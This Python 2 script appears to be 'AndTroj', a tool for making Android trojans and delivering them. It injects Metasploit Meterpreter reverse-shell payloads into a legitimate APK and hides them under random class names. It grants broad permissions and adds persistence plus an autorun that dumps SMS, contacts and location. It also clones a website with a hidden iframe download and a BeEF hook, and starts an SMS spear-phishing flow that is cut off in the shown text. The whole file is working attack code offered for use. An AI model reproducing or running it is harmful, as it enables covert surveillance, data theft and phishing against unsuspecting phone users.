#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# https://t.me/unk9vvn
# AVI
import sys, os, time, random, socket, urllib2, subprocess, string, shutil
from twilio.rest import Client
from urllib2 import urlopen
from threading import Timer
from json import load

try:
    from colorama import Fore, Back, Style

    r = Fore.RED
    g = Fore.GREEN
    w = Fore.WHITE
    b = Fore.BLUE
    y = Fore.YELLOW
    m = Fore.MAGENTA
    res = Style.RESET_ALL
    os.system("service postgresql start && service tor start")

except ImportError:
    os.system("pip install colorama twilio flask")
    pass


def apktinstaller():
    cmd = 'apktool -version'
    fp = os.popen(cmd)
    res = fp.read()
    if res > "2.3.4":
        pass
    else:
        os.system("apt-get install -y tor apktool aapt proxychains && service tor start && "
                  "proxychains wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.3.4.jar -O /usr/local/bin/apktool.jar && "
                  "wget https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool -O /usr/local/bin/apktool && "
                  "chmod +x /usr/local/bin/apktool.jar && chmod +x /usr/local/bin/apktool")

apktinstaller()


def cls():
    linux = 'clear'
    windows = 'cls'
    os.system([linux, windows][os.name == 'nt'])

cls()


dir = "/usr/share/AndTroj"


def ins():
    check = os.path.exists('/usr/share/AndTroj/')
    if check == (False):
        executor = '#!/bin/bash\npython /usr/share/AndTroj/atj.py "$@"'
        commandline = open('/usr/bin/atj', 'w')
        commandline.write(executor)
        commandline.close()
        os.system(
            'mkdir /usr/share/AndTroj && cp debug.keystore atj.py /usr/share/AndTroj/ && chmod +x /usr/share/AndTroj/atj.py && '
            'chmod +x /usr/bin/atj')
    else:
        pass

ins()


def print_logo():
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """
                             `-::///+++/+++/:-.                     
                        `-//:::.-:-`:/..:/`:--++oo/.                
                     -///:-`/.::::/`/:.:/:`o.+/:`:++oo:`            
                  `/+/--`+/-`:.::/+ooo+ooo+/:/-`o:o`+./yo.          
                `+o-/:.::`/+o+//:.+/:-:/:`+o/+os+:`/-/+`:ss.        
              `.:-.`...`.---.---. .``.``` ..:s:::--+:-//s..o/`      
             .:-`.-:`.--..-..-..::..:/:: :+/`/--+/:-oh/-.:-/-y:     
            -/``-:..//-:-.-.+o++:`  +:o-  .+osd+.+:+:.--::::--s+    
           :/`/::`:+:/:-.:+/soo::` .::/:. -:+yyh/do`:+:.yo-o// oo   
          :+`:::.++` .-+.o++:.  `+hhdddddyo. `-ssys:h`  `sy`-//`o+  
         .y`::-.+s`   /:oo+.   `oyhddmmmhmmd.  `:ydhd-`   sy`+-/.h: 
         o/.-..:y`  :o.+/o/    -ssssshhdydhh:    /mds.h`  `h+-:: /d`
        `s`::+-y/   /dsy+.o/`  `++--/ss:.-+o`   :h/yh/s`   :m.y/y`d:
        :s`::--h`  :-/s+o`.o+.  ++--++/+-.+:  `oh--yoh-+.  `m/.:-`s+
        +o`//-+h`  -o:yh-  .sy/`:+sys--ohyo:`/hy.  omydd    ho-::`+y
        +o`//-/h   `:ys/s   `/yy:` ohyshs `/hd+`  -h+ms.`   yo.o/.+y
        :y -:--m`  /s+yho`    `+hh+.-:::-+hdo.`   .mm+sh`  `m:+/o-so
        `h`/:+`h/   :hmh/y   s` `:yds//ydy/` .o- -hoNNy`   :m./:-`d:
         +:`:-.-o`  .:::/o`` :`  ::+osyyy//  :-..:so///`  `y+-/:.:y 
         .s`.:--/+`  -oso+.o. -/ooo+:``:+ysyo/`ohoNmms`   sy./::.h- 
          :+..::.oo`  `:::/yyys. `/:++o+:/` -dmmho+/.    sh./::.so  
           /o`:-:-+y-  .-+yhddmhsh/.```.:+dhmmdNmdy/`  .hs:/:-.os   
            /s./.:--so.   .//+sdmhdms-:dmhdmds++:    `od:-.//-so    
             -s::.:-/:o:. :::--:+oyy/`-oyyo+::-./+/.oh+///+.-h:     
              `+o./-:-:-+so/+//:..`  `` ```/+/so/shs::`///.ss`      
                .oo--+/--/:+osso++s-`os///./+ssso:-//./`.sy-        
                  .+o:`:+/.+`:.:++oooooosoo+::/::+.++./so-          
                     .+o/.-.:/`+/:-:/`/`+ +//-++`:-+ss:`            
                        ./+++:-/-`:/-`+`+`-/--/oos+-                
                            `.:/+++ooo+ooooo+:`                     
                                  Unk9vvN
                            https://t.me/Unk9vvN
                                  AndTroj
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.01)

print_logo()


def USER():
    host = socket.gethostname()
    print "\t[i] USER: {0}".format(host)
    pass

USER()


def LAN():
    if (True):
        try:
            print'\t[i]  LAN:', ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
                          if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
                          s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
                          socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
            return True
        except:
            print "Disconnected"
            return False

LAN()


def WLAN():
    if (True):
        try:
            WAN = urlopen('http://ip.42.pl/raw').read()
            print "\t[i]  WAN: {0}".format(WAN)
            print "\t[i]  USE CMD: atj"
            return True
        except urllib2.URLError as err:
            print "\t[i]  WAN: Disconnected"
            print "\t[i]  RUN CMD: atj"
            return False

WLAN()


def randomword(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

tmp = dir + "/tmp/"
metdod = tmp + "payld_protocol.txt"
netdod = tmp + "ngrok_url.txt"
orga = tmp + "orgapp.apk"
paya = tmp + "payload.apk"
out1 = tmp + "orgapp"
out2 = tmp + "payload"
out3 = tmp + "launch.txt"
out4 = tmp + "lach.txt"
out5 = tmp + "pes.txt"
out6 = tmp + "persis.sh"
skim = '\\'
skin = '\\'
skoft = skim + skin
addrses = tmp + "output.txt"
rand1 = randomword(10)
rand2 = randomword(10)
rand3 = randomword(10)
rand4 = randomword(10)
rand5 = randomword(10)
rand6 = randomword(10)
rand7 = randomword(10)
met1 = out1 + '/smali/com/' + rand1 + '/' + rand2 + '/'
met2 = out2 + '/smali/com/metasploit/stage/'


def checkdir():
    check = os.path.exists('/usr/share/AndTroj/tmp')
    if check == (False):
        os.system("mkdir {0}/tmp".format(dir))
        os.system("chmod +x {0}/tmp".format(dir))
    else:
        os.system("rm -r {0}/tmp".format(dir))
        os.system("mkdir {0}/tmp".format(dir))
        os.system("chmod +x {0}/tmp".format(dir))
        pass

checkdir()


def main():
    payld = raw_input("\n\t[1] meterpreter/reverse_tcp\n\t"
                      "[2] meterpreter/reverse_http\n\t"
                      "[3] meterpreter/reverse_https\n\t"
                      "[4] Install NoIP\n\t"
                      "[0] EXIT\n\t"
                      "\n\nroot@unk9vvn:~#: ")
    global ORG
    global CON
    global PORT
    global MAM
    global IP
    print "\n"
    if payld == "1":
        ORG = raw_input("\t[?] ORG-APK: ")
        IP = raw_input("\t[?] LHOST: ")
        PORT = raw_input("\t[?] LPORT: ")
        print "\n"
        subprocess.call(
            'msfvenom -p android/meterpreter/reverse_tcp LHOST=' + IP + ' LPORT=' + PORT + ' R > ' + tmp + 'payload.apk',
            shell=True)
        subprocess.call(
            'echo "reverse_tcp" > ' + tmp + 'payld_protocol.txt'
            , shell=True)
    elif payld == "2":
        ORG = raw_input("\t[?] ORG-APK: ")
        IP = raw_input("\t[?] LHOST: ")
        PORT = raw_input("\t[?] LPORT: ")
        print "\n"
        subprocess.call(
            'msfvenom -p android/meterpreter/reverse_http LHOST=' + IP + ' LPORT=' + PORT + ' R > ' + tmp + 'payload.apk',
            shell=True)
        subprocess.call(
            'echo "reverse_http" > ' + tmp + 'payld_protocol.txt'
            , shell=True)
    elif payld == "3":
        ORG = raw_input("\t[?] ORG-APK: ")
        IP = raw_input("\t[?] LHOST: ")
        PORT = raw_input("\t[?] LPORT: ")
        print "\n"
        subprocess.call(
            'msfvenom -p android/meterpreter/reverse_https LHOST=' + IP + ' LPORT=' + PORT + ' R > ' + tmp + 'payload.apk',
            shell=True)
        subprocess.call(
            'echo "reverse_https" > ' + tmp + 'payld_protocol.txt'
            , shell=True)
    elif payld == "4":
        print "\n\t[i] Visit & Register > https://www.noip.com/sign-up\n\t[i] Login & Create Host > https://www.noip.com/login\n"
        check = os.path.exists('/usr/share/noip-2.1.9-1')
        if check == (False):
            subprocess.call(
                'cd /usr/share/ && wget https://www.noip.com/client/linux/noip-duc-linux.tar.gz && tar xzf noip-duc-linux.tar.gz && rm noip-duc-linux.tar.gz && cd noip-2.1.9-1 && make && make install',
                shell=True)
            print(os.system("noip2 && noip2 -S"))
	    print_logo()
	    USER()
	    LAN()
	    WLAN()
	    checkdir()
	    main()
        else:
            print(os.system("noip2 && noip2 -S"))
	    print_logo()
	    USER()
	    LAN()
	    WLAN()
	    checkdir()
	    main()
    elif payld == "0":
        sys.exit()
    else:
        main()

    ORIG = (' ' in ORG) == True
    if ORIG == (True):
        CON = ORG.replace(" ", "_")
        shutil.copyfile(ORG, "{0}".format(CON))
        subprocess.call(
            'mv ' + CON + ' ' + orga,
            shell=True)
    else:
        subprocess.call(
            'cp ' + ORG + ' ' + orga,
            shell=True)
        pass
    subprocess.call(
        'apktool -f d ' + paya + ' -o ' + out2,
        shell=True)
    subprocess.call(
        'apktool -f d ' + orga + ' -o ' + out1,
        shell=True)
    print "I: Injecting payload..."
    che = os.path.exists('{0}/smali/com'.format(out1))
    if che == (False):
        os.system("mkdir {0}/smali/com".format(out1))
    else:
        pass
    subprocess.call(
        'mkdir ' + out1 + '/smali/com/' + rand1,
        shell=True)
    subprocess.call(
        'mkdir ' + out1 + '/smali/com/' + rand1 + '/' + rand2,
        shell=True)
    subprocess.call(
        'cp -r ' + out2 + '/smali/com/metasploit/stage/Payload.smali ' + out1 + '/smali/com/' + rand1 + '/' + rand2 + '/' + rand3 + '.smali',
        shell=True)
    print "I: Obfuscating resource files..."
    subprocess.call(
        'cd ' + met2 + ' && cp MainService.smali MainBroadcastReceiver.smali MainActivity.smali f.smali e.smali d.smali c.smali b.smali a.smali ' + met1,
        shell=True)
    subprocess.call(
        'sed -i "s#/metasploit/stage#/' + rand1 + '/' + rand2 + '#g" ' + met1 + '*',
        shell=True)
    subprocess.call(
        'sed -i "s#Payload#' + rand3 + '#g" ' + met1 + '*',
        shell=True)
    subprocess.call(
        'sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.' + rand4 + '.' + rand5 + '.' + rand6 + '#" ' + met1 + rand3 + '.smali',
        shell=True)
    subprocess.call(
        'sed -i "s#payload#' + rand7 + '#g" ' + met1 + rand3 + '.smali',
        shell=True)
    print "I: Adding all permissions..."
    subprocess.call(
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WAKE_LOCK"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_SMS"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CAMERA"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_CONTACTS"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CALL_PHONE"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.SEND_SMS"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\' ' + out1 + '/AndroidManifest.xml && '
        'sed -i \'/xmlns:android=/a \    <uses-permission android:name="android.permission.INTERNET"/>\' ' + out1 + '/AndroidManifest.xml',
        shell=True)
    subprocess.call(
        "LIN=$(awk '/category.LAUNCHER/{ print NR - 3 }' " + out1 + "/AndroidManifest.xml) && sed -n \"$LIN\"p " + out1 + "/AndroidManifest.xml > " + tmp + "launch.txt",
        shell=True)
    with open('{0}launch.txt'.format(tmp)) as myfile:
        if 'android:name=' in myfile.read():
            print "I: Founded Main Activity..."
        else:
            subprocess.call(
                "LIN=$(awk '/category.LAUNCHER/{ print NR - 4 }' " + out1 + "/AndroidManifest.xml) && sed -n \"$LIN\"p " + out1 + "/AndroidManifest.xml > " + tmp + "launch.txt",
                shell=True)
            pass
    subprocess.call(
        "grep -o 'android:name=\"[^\"]*' " + out3 + " > " + tmp + "lach.txt",
        shell=True)
    subprocess.call(
        'sed -i -e \'s/\(android:\|name\|=\"\)//g\' ' + tmp + "lach.txt",
        shell=True)
    subprocess.call(
        "tr '.' '/' <" + out4 + " >" + tmp + "output.txt",
        shell=True)
    print "I: Injecting startup launcher..."
    subprocess.call(
        "GIZ=$(cat " + addrses + ") && sed -i '/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a " + skoft + "n\ \ \ \ invoke-static \{p0\}, Lcom/'" + rand1 + "'\/'" + rand2 + "'\/'" + rand3 + "'\;->start(Landroid\/content\/Context;)V' " + out1 + "/smali/\"$GIZ\".smali",
        shell=True)
    subprocess.call(
        "PIN=$(awk '/package=/{ print NR}' " + out1 + "/AndroidManifest.xml) && sed -n \"$PIN\"p " + out1 + "/AndroidManifest.xml > " + tmp + "pes.txt",
        shell=True)
    subprocess.call(
        "grep -o 'package=\"[^\"]*' " + out5 + " > " + tmp + "pers.txt",
        shell=True)
    subprocess.call(
        'sed -i -e \'s/\(package="\|name\|=\"\)//g\' ' + tmp + "pers.txt",
        shell=True)
    subprocess.call(
        'FIL="#!" && echo "$FIL/bin/bash" > /usr/share/AndTroj/tmp/persis.sh && echo "while true" >> /usr/share/AndTroj/tmp/persis.sh && echo "do am start '
        '--user 0 -a android.intent.action.MAIN -n com.metasploit.stage/.MainActivity" >> /usr/share/AndTroj/tmp/persis.sh && echo '
        '"sleep 600" >> /usr/share/AndTroj/tmp/persis.sh && echo "done" >> /usr/share/AndTroj/tmp/persis.sh',
        shell=True)
    subprocess.call(
        'GUZ=$(cat ' + tmp + 'pers.txt) && sed -i "s#com.metasploit.stage#"$GUZ"#" ' + out6,
        shell=True)
    subprocess.call(
        'GUS=$(cat ' + out4 + ') && sed -i "s#.MainActivity#"$GUS"#" ' + out6,
        shell=True)
    print "I: Generating persistence..."
    subprocess.call(
        'echo "upload ' + tmp + 'persis.sh" > ' + tmp + 'autoand.rc && echo "execute -f \"sh persis.sh\"" >> ' + tmp + 'autoand.rc && echo "dump_sms" >> ' + tmp + 'autoand.rc && echo "dump_contacts" >> ' + tmp + 'autoand.rc && echo "geolocate" >> ' + tmp + 'autoand.rc && echo "download /data/data/com.android.providers.telephony/databases/mmssms.db" >> ' + tmp + 'autoand.rc && echo "run post/android/capture/screen" >> ' + tmp + 'autoand.rc',
        shell=True)
    print "I: Clear data templates..."
    subprocess.call(
        'cd ' + tmp + ' && rm pers.txt pes.txt launch.txt output.txt lach.txt',
        shell=True)
    print "I: Compile original apk..."
    subprocess.call(
        'apktool b ' + out1,
        shell=True)
    print "I: Signin unknown cert apk..."
    subprocess.call(
        'jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ' + dir + '/debug.keystore ' + out1 + '/dist/orgapp.apk alias_name -storepass 00980098',
        shell=True)
    SVG = (' ' in ORG) == True
    if SVG == (True):
        CON = ORG.replace(" ", "_")
        MAM = os.path.splitext("{0}".format(CON))[0]
        subprocess.call(
            'mv {0}/dist/orgapp.apk {1}-b.apk'.format(out1, MAM),
            shell=True)
    else:
        MAM = os.path.splitext("{0}".format(ORG))[0]
        subprocess.call(
            'mv {0}/dist/orgapp.apk {1}-b.apk'.format(out1, MAM),
            shell=True)
        print "[i] generating torjan /root"
        pass

main()


def print_engeener():
    cls()
    clear = "\x1b[0m"
    colors = [36, 32, 34, 35, 31, 37]

    x = """
                 ___          _      _ 
                / __| ___  __(_)__ _| |
                \__ \/ _ \/ _| / _` | |
                |___/\___/\__|_\__,_|_|
                                       
                 ___           _                  _           
                | __|_ _  __ _(_)_ _  ___ ___ _ _(_)_ _  __ _ 
                | _|| ' \/ _` | | ' \/ -_) -_) '_| | ' \/ _` |
                |___|_||_\__, |_|_||_\___\___|_| |_|_||_\__, |
                         |___/                          |___/ 
                                Unk9vvN
                          https://t.me/Unk9vvN
                                AndTroj

[i] You need Port Forwarded to ports > 53-80-3000-5432-55552-4141-5151-8000
[i] Register & Buy Business License > https://dashboard.ngrok.com/user/signup
[i] Register & Buy a Spoof Number > https://www.twilio.com/try-twilio
"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
        time.sleep(0.01)

print_engeener()


def socialEng():
    main_eng = raw_input("\t[1] WEB SpearPhishing\n\t"
                          "[2] SMS SpearPhishing\n\t"
                          "[3] FileFormat Injection(Disabled)\n\t"
                          "[4] Install Ngrok-Twtlio\n\t"
                          "[0] EXIT\n\t"
                          "\n\nroot@unk9vvn:~#: ")
    global socialEng, Message, TargetNum, IP_CLONE, Ngik, SSLURL, SID_twtl, Twtl, LLANs, WWAN
    if main_eng == "1":
        checkauth = os.path.exists('/root/.ngrok2/ngrok.yml')
        if checkauth == (True):
            IP_CLONE = raw_input("\n\n\t[?] URL CLONE: ")
            LLANs = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
                              if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
                              s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
                              socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
            Ngik = raw_input("\n\t[1] Ngrok FreeURL(Free)"
                             "\n\t[2] Ngrok CustomURL(Business)"
                             "\n\n\nroot@unk9vvn:~#: ")
            print "\n"
            if Ngik == "1":
                subprocess.call(
                    'ngrok update'
                    , shell=True)
                subprocess.call(
                    'gnome-terminal --tab -e \'ngrok http 80\''
                    , shell=True)
            elif Ngik == "2":
                SSLURL = raw_input("\n\t[i] Example: instagram.com"
                                   "\n\t[?] CustomURL: ")
                subprocess.call(
                    'ngrok update'
                    , shell=True)
                subprocess.call(
                    'gnome-terminal --tab -e \'ngrok tls -hostname=' + SSLURL + ' 443\''
                    , shell=True)
            else:
                subprocess.call(
                    'ngrok update'
                    , shell=True)
                subprocess.call(
                    'gnome-terminal --tab -e \'ngrok http 80\''
                    , shell=True)
            subprocess.call(
                'cp ' + MAM + '-b.apk /var/www/html/'
                , shell=True)
            pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]

            for pid in pids:
                try:
                    cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read()
                    if cmd.find('ruby') != -1:
                        print "Kill PID: %s; Command: %s" % (pid, cmd)
                        subprocess.call(
                            'ps -ef | grep ruby | grep -v grep | awk \'{print $2}\' | xargs kill'
                            , shell=True)
                except IOError:
                    continue
            subprocess.call(
                'sed -i \'137s/.*/        enable: true/\' /usr/share/beef-xss/config.yaml && '
                'sed -i \'156s/.*/            enable: true/\' /usr/share/beef-xss/config.yaml'
                , shell=True)
            subprocess.call(
                'sed -i \'45s/.*/        dns_host: "' + IP + '"/\' /usr/share/beef-xss/config.yaml && '
                'sed -i \'103s/.*/        db_host: "' + IP + '"/\' /usr/share/beef-xss/config.yaml'
                , shell=True)
            subprocess.call(
                'sed -i \'18s/.*/            host: "' + LLANs + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml && '
                'sed -i \'28s/.*/            callback_host: "' + LLANs + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml'
                , shell=True)
            check = os.path.exists('/var/www/html/index.html')
            if check == (False):
                subprocess.call(
                    'service apache2 start && cd /var/www/html/ && wget --no-check-certificate -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + IP_CLONE + '"'
                    , shell=True)
                subprocess.call(
                    'sed -i \'s#</body>#<iframe id="frame" src="' + MAM + '-b.apk" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\\n<script src="http://' + IP + ':3000/hook.js"></script>\\n<script type="text/javascript">setTimeout(function(){window.location.href="' + IP_CLONE + '";}, 15000);</script></body>#g\' /var/www/html/index.html'
                    , shell=True)
                subprocess.call(
                    'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + skin + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + skin + '" type=' + skin + '"text/javascript' + skin + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html'
                    , shell=True)
                subprocess.call(
                    'sed -i -e \'s/\/root\///g\' /var/www/html/index.html'
                    , shell=True)
                subprocess.call(
                    'sed -i -e \'s#iIIi#\\\#g\' /var/www/html/index.html'
                    , shell=True)
                f = open(metdod, "r")
                cont = f.read()
                if cont == "reverse_tcp":
                    subprocess.call(
                        'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LLANs + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + IP + ';set LPORT ' + PORT + ';set ReverseListenerBindAddress ' + LLANs + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\''
                        , shell=True)
                elif cont == "reverse_http":
                    subprocess.call(
                        'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LLANs + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_http;set LHOST ' + IP + ';set LPORT ' + PORT + ';set ReverseListenerBindAddress ' + LLANs + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\''
                        , shell=True)
                elif cont == "reverse_https":
                    subprocess.call(
                        'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LLANs + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' + IP + ';set LPORT ' + PORT + ';set ReverseListenerBindAddress ' + LLANs + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\''
                        , shell=True)
                else:
                    subprocess.call(
                        'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LLANs + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + IP + ';set LPORT ' + PORT + ';set ReverseListenerBindAddress ' + LLANs + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\''
                        , shell=True)
            else:
                subprocess.call(
                    'rm /var/www/html/index.html'
                    , shell=True)
                subprocess.call(
                    'service apache2 start && cd /var/www/html/ && wget --no-check-certificate -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + IP_CLONE + '"'
                    , shell=True)
                subprocess.call(
                    'sed -i \'s#</body>#<iframe id="frame" src="' + MAM + '-b.apk" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\\n<script src="http://' + IP + ':3000/hook.js"></script>\\n<script type="text/javascript">setTimeout(function(){window.location.href="' + IP_CLONE + '";}, 15000);</script></body>#g\' /var/www/html/index.html'
                    , shell=True)
                subprocess.call(
                    'sed -i -e \'s/\/root\///g\' /var/www/html/index.html'
                    , shell=True)
                f = open(metdod, "r")
                cont = f.read()
                if cont == "reverse_tcp":
                    subprocess.call(
                        'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LLANs + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + IP + ';set LPORT ' + PORT + ';set ReverseListenerBindAddress ' + LLANs + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\''
                        , shell=True)
                elif cont == "reverse_http":
                    subprocess.call(
                        'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LLANs + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_http;set LHOST ' + IP + ';set LPORT ' + PORT + ';set ReverseListenerBindAddress ' + LLANs + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\''
                        , shell=True)
                elif cont == "reverse_https":
                    subprocess.call(
                        'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LLANs + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_https;set LHOST ' + IP + ';set LPORT ' + PORT + ';set ReverseListenerBindAddress ' + LLANs + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\''
                        , shell=True)
                else:
                    subprocess.call(
                        'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LLANs + ' Pass=abc123;use multi/handler;set PAYLOAD android/meterpreter/reverse_tcp;set LHOST ' + IP + ';set LPORT ' + PORT + ';set ReverseListenerBindAddress ' + LLANs + ';set AutoRunScript ' + tmp + 'autoand.rc;set AndroidWakelock true;exploit -j"\''
                        , shell=True)
            print "\nI: Please 5 sec waiting...\n"
            time.sleep(10.0)
            subprocess.call(
                'cd /usr/share/beef-xss/ && gnome-terminal --tab -e \'./beef\''
                , shell=True)
            print "\nI: Please 10 sec waiting...\n"
            time.sleep(10.0)
            checkng = os.path.exists('/usr/share/AndTroj/tmp/ngrok_url.txt')
            if checkng == (False):
                subprocess.call(
                    'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt'
                    , shell=True)
            else:
                subprocess.call(
                    'rm /usr/share/AndTroj/tmp/ngrok_url.txt'
                    , shell=True)
                subprocess.call(
                    'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt'
                    , shell=True)
            fs = open(netdod, "r")
            contr = fs.read()
            subprocess.call(
                'gnome-terminal --tab -e \'firefox -url ' + contr + ' -new-tab -url http://' + LLANs + ':3000/ui/panel\''
                , shell=True)
            print "I: Start BeEF status..."
            print "I: Start Ngrok status..."
            print "I: Start Apache2 status..."
            print "I: Start Msfconsole listing..."
            print "I: Start Launching SpearPhishing status..."
            print "\n\t[*] Join my channel > https://t.me/Unk9vvN"
            print_engeener()
            socialEng()
        else:
            print "\n\t[X] Please selected 4 item for install Ngrok BeEF and Twilio..."
            print_engeener()
            socialEng()

    elif main_eng == "2":
        SLAN = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
                              if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
                              s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
                              socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
        checkauth = os.path.exists('/usr/share/twilio/twilio_token.txt')
        if checkauth == (True):
            IP_CLONE = raw_input("\n\n\t[i] Example: +12565734104\n"
                                 "\t[?] Your Number: ")
            TargetNum = raw_input("\n\t[i] Example: +989381234567\n"
                                  "\t[?] Target Number: ")
            Message = raw_input("\n\t[i] Example: Would you like to hide the unk9vvn team?\n"
                                "\t[?] Message Content: ")
            print "\n"
            subprocess.call(
                'ngrok update'
                , shell=True)
